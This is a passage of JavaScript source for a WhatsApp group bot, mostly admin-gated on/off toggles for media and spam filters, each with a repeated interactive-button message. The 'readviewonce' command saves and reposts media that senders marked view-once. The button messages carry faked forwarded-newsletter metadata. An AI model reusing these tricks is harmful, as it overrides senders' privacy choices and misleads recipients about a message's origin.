               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'react': {
                if (!aespispTheCreator) return aespispStickOwner()
                reactionMessage = {
                    react: {
                        text: args[0],
                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                    }
                }
                ArielStore.sendMessage(m.chat, reactionMessage)
            }
            break
  case 'userjid':
  case 'jid':
  case 'groupjid':
            case 'id':{
            replygcaespisp(from)
           }
          break
            case 'antiaudio':{
            	if (!m.isGroup) return aespispStickGroup()
if (!isBotAdmins) return aespispStickBotAdmin()
if (!isAdmins && !aespispTheCreator) return aespispStickAdmin()
               
               if (args[0] === 'on') {
                  db.data.chats[from].antiaudio = true
                  replygcaespisp(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antiaudio = false
                  replygcaespisp(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antiforeign':{
            	if (!m.isGroup) return aespispStickGroup()
if (!isBotAdmins) return aespispStickBotAdmin()
if (!isAdmins && !aespispTheCreator) return aespispStickAdmin()
               
               if (args[0] === 'on') {
                  db.data.chats[m.chat].antiforeignnum = true
                  replygcaespisp(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[m.chat].antiforeignnum = false
                  replygcaespisp(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'poll': {
	if (!aespispTheCreator) return aespispStickOwner()
            let [poll, opt] = text.split("|")
            if (text.split("|") < 2)
                return await replygcaespisp(
                    `Mention question and atleast 2 options\nExample: ${prefix}poll Who is best admin?|aespisp,ariel,kontol...`
                )
            let options = []
            for (let i of opt.split(',')) {
                options.push(i)
            }
            await ArielStore.sendMessage(m.chat, {
                poll: {
                    name: poll,
                    values: options
                }
            })
        }
        break
            case 'antipoll':{
            	if (!m.isGroup) return aespispStickGroup()
if (!isBotAdmins) return aespispStickBotAdmin()
if (!isAdmins && !aespispTheCreator) return aespispStickAdmin()
               
               if (args[0] === 'on') {
                  db.data.chats[from].antipoll = true
                  replygcaespisp(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antipoll = false
                  replygcaespisp(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antisticker':{
            	if (!m.isGroup) return aespispStickGroup()
if (!isBotAdmins) return aespispStickBotAdmin()
if (!isAdmins && !aespispTheCreator) return aespispStickAdmin()
               
               if (args[0] === 'on') {
                  db.data.chats[from].antisticker = true
                  replygcaespisp(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antisticker = false
                  replygcaespisp(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antiimage':{
            	if (!m.isGroup) return aespispStickGroup()
if (!isBotAdmins) return aespispStickBotAdmin()
if (!isAdmins && !aespispTheCreator) return aespispStickAdmin()
               
               if (args[0] === 'on') {
                  db.data.chats[from].antiimage = true
                  replygcaespisp(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antiimage = false
                  replygcaespisp(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antivideo':{
            	if (!m.isGroup) return aespispStickGroup()
if (!isBotAdmins) return aespispStickBotAdmin()
if (!isAdmins && !aespispTheCreator) return aespispStickAdmin()
               
               if (args[0] === 'on') {
                  db.data.chats[from].antivideo = true
                  replygcaespisp(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antivideo = false
                  replygcaespisp(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antivirtex':{
		         if (!m.isGroup) return aespispStickGroup()
if (!isBotAdmins) return aespispStickBotAdmin()
if (!isAdmins && !aespispTheCreator) return aespispStickAdmin()
               
               if (args[0] === 'on') {
                  db.data.chats[from].antivirtex = true
                  replygcaespisp(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antivirtex = false
                  replygcaespisp(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antibot':{
		         if (!m.isGroup) return aespispStickGroup()
if (!isBotAdmins) return aespispStickBotAdmin()
if (!isAdmins && !aespispTheCreator) return aespispStickAdmin()
               
               if (args[0] === 'on') {
                  db.data.chats[from].antibot = true
                  replygcaespisp(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antibot = false
                  replygcaespisp(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'readviewonce': case 'rvo': {
	if (!m.quoted) return replygcaespisp(`Reply to view once message`)
	if (m.quoted.mtype !== 'viewOnceMessageV2') return replygcaespisp(`This is not a view once message`)
    let msg = m.quoted.message
    let type = Object.keys(msg)[0]
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return ArielStore.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
    } else if (/image/.test(type)) {
        return ArielStore.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
    }
}
break
            case 'antiviewonce':{
		         if (!m.isGroup) return aespispStickGroup()
if (!isBotAdmins) return aespispStickBotAdmin()
if (!isAdmins && !aespispTheCreator) return aespispStickAdmin()
               
               if (args[0] === 'on') {
                  db.data.chats[from].antiviewonce = true
                  replygcaespisp(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antiviewonce = false
                  replygcaespisp(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antispam':{
		         if (!m.isGroup) return aespispStickGroup()
if (!isBotAdmins) return aespispStickBotAdmin()
if (!isAdmins && !aespispTheCreator) return aespispStickAdmin()
               
               if (args[0] === 'on') {
                  db.data.chats[from].antispam = true
                  replygcaespisp(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antispam = false
                  replygcaespisp(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antimedia':{
		         if (!m.isGroup) return aespispStickGroup()
if (!isBotAdmins) return aespispStickBotAdmin()
if (!isAdmins && !aespispTheCreator) return aespispStickAdmin()
               
               if (args[0] === 'on') {
                  db.data.chats[from].antimedia = true
                  replygcaespisp(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antimedia = false
                  replygcaespisp(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antidocument':{
		         if (!m.isGroup) return aespispStickGroup()
if (!isBotAdmins) return aespispStickBotAdmin()
if (!isAdmins && !aespispTheCreator) return aespispStickAdmin()
               
               if (args[0] === 'on') {
                  db.data.chats[from].antidocument = true
                  replygcaespisp(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antidocument = false
                  replygcaespisp(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'anticontact':{
		         if (!m.isGroup) return aespispStickGroup()
if (!isBotAdmins) return aespispStickBotAdmin()
if (!isAdmins && !aespispTheCreator) return aespispStickAdmin()
         
               if (args[0] === 'on') {
                  db.data.chats[from].anticontact = true
                  replygcaespisp(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].anticontact = false
                  replygcaespisp(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antilocation':{
		         if (!m.isGroup) return aespispStickGroup()
